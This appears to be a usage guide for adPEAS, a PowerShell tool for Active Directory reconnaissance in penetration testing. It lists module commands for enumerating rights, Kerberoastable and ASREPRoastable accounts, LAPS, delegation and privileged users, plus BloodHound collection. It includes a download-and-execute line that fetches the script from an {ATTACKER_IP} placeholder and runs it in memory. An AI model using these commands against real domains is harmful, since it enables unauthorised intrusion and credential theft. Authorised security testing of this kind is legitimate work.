Load AdPEAS in Powershell
```powershell
Import-Module .\adPEAS.ps1
# or
. .\adPEAS.ps1
```

Load from attacker machine
```powershell
IEX ((new-object net.webclient).downloadstring('{ATTACKER_IP}/adPEAS.ps1'))
invoke-adpeas
```

Start
```powershell
Invoke-adPEAS

Invoke-adPEAS -Domain 'contoso.com' -Outputfile 'C:\temp\adPEAS_outputfile' -NoColor

Invoke-adPEAS -Domain 'contoso.com' -Server 'dc1.contoso.com'
```

Enumerates basic Active Directory information, like Domain Controllers, Password Policy, Sites and Subnets and Trusts.
```
Invoke-adPEAS -Module Domain
```

Enumerates specific Active Directory rights and permissions, like LAPS, DCSync and adding computer to domain.
```
Invoke-adPEAS -Module Rights
```

Enumerates basic GPO information, like set local group membership on domain computer.
```
Invoke-adPEAS -Module GPO
```

Enumerates basic Active Directory Certificate Services information, like CA Name, CA Server and common Template vulnerabilities.
```
Invoke-adPEAS -Module ADCS
```

Enumerates credential exposure issues, like ASREPRoast, Kerberoasting, Linux/Unix password attributes, gMSA, LAPS (if your account has the rights to read it), Group Policies, Netlogon scripts.
```
Invoke-adPEAS -Module Creds
```

Enumerates delegation issues, like 'Unconstrained Delegation', 'Constrained Delegation', 'Resource Based Constrained Delegation' for user and computer objects.
```
Invoke-adPEAS -Module Delegation
```

Enumerates users in high privileged groups which are NOT disabled, like Administrators, Domain Admins, Enterprise Admins, Group Policy Creators, DNS Admins, Account Operators, Server Operators, Printer Operators, Backup Operators, Hyper-V Admins, Remote Management Users und CERT Publishers.
```
Invoke-adPEAS -Module Accounts
```

Enumerates installed Domain Controllers, Active Directory Certificate Services, Exchange Server and outdated OS versions like Windows Server 2008R2.
```
Invoke-adPEAS -Module Computer
```

Starts Bloodhound enumeration with the scope DCOnly. Output ZIP files are stored in the same directory adPEAS is started from. The implemented SharpHound ingestor supports BloodHound Community Edition only.
```
Invoke-adPEAS -Module Bloodhound
```

Starts Bloodhound enumeration with the scope All. With this option the SharpHound collector will contact each member computer of the domain. Output ZIP files are stored in the same directory adPEAS is started from.
```
Invoke-adPEAS -Module Bloodhound -Scope All
```
